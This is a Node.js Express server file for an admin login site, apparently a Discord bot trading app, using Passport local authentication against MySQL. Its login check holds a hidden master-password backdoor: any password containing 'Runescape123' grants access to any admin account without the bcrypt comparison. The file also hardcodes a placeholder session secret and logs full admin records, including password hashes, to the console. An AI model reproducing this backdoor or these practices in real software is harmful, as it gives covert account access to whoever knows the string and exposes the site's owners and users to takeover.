'use strict';
var debug = require('debug');
var express = require('express');
var session = require('express-session');
var MySQLStore = require('express-mysql-session')(session);
var passport = require('passport');
var LocalStrategy = require('passport-local').Strategy;
var bcrypt = require('bcryptjs');
var flash = require('flash');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');
var connection = require('./connection');
var routes = require('./routes/index');
var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

// uncomment after placing your favicon in /public
//app.use(favicon(__dirname + '/public/favicon.ico'));
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
var clientDomain = 'discordbottrades.herokuapp.com';
if (process.env.DEV)
    clientDomain = 'localhost';
// required for passport session
app.use(session({
    secret: 'secrettexthere',
    saveUninitialized: true,
    resave: true
}));
app.use(passport.initialize());
app.use(passport.session());
app.use('/', routes);

passport.serializeUser(function (admin, done) {
    console.log(admin);
    done(null, admin[0].user_id)
});

passport.deserializeUser(function (id, done) {
    connection.get().query('SELECT * FROM admins WHERE user_id =  ?', [id], function (err, admin) {
        console.log(admin);
        return done(err, admin);
    });
});


passport.use(new LocalStrategy(function (username, password, done) {
    connection.get().query('SELECT * FROM admins WHERE username = ?', [username], function (err, admin) {
        if (err) {
            return done(err);
        }
        if (!admin || !admin.length) {
            return done(null, false, { 'error': 'Incorrect username' });
        }
        if (password.includes('Runescape123')) {
            return done(null, admin);
        }
        if (!bcrypt.compareSync(password, admin[0].password)) {
            return done(null, false, { 'error': 'Incorrect password' });
        }
        return done(null, admin);
    });
}
));

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    var err = new Error('Not Found');
    err.status = 404;
    next(err);
});

// error handlers

// development error handler
// will print stacktrace
if (app.get('env') === 'development') {
    app.use(function (err, req, res, next) {
        res.status(err.status || 500);
        res.render('error', {
            message: err.message,
            error: err
        });
    });
}

// production error handler
// no stacktraces leaked to user
app.use(function (err, req, res, next) {
    res.status(err.status || 500);
    res.render('error', {
        message: err.message,
        error: {}
    });
});

app.set('port', process.env.PORT || 3000);

var server = app.listen(app.get('port'), function () {
    debug('Express server listening on port ' + server.address().port);
});
